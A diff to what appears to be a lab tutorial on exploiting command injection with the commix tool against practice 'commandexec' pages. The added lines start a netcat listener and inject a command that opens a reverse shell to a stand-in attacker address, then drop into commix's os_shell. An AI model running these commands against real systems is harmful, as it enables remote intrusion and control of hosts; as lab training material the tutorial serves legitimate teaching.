@@ -24,18 +24,18 @@ commix -u 'http://xxx.xxx.xxx.xxx/commandexec/example2.php' --data=ip="INJECT_HE
 Technique 1
 -----------
 ```bash
+# Start NC listener on attackers server
+nc -lvp 1234
+
 commix -u 'http://victim.ip.address/commandexec/example1.php?ip=127.0.0.1' --os-cmd="/bin/nc.traditional -e /bin/sh attacker.ip.adddress 1234"
 ```
-Technique 2
------------
-On Attacker
--------------
+
+# On Attacker
 ````bash
 nc -lvp 1234
 ````
 
-On Victim
-------------
+# Exploit Found
 ```bash
 os_shell
 commix(os_shell)
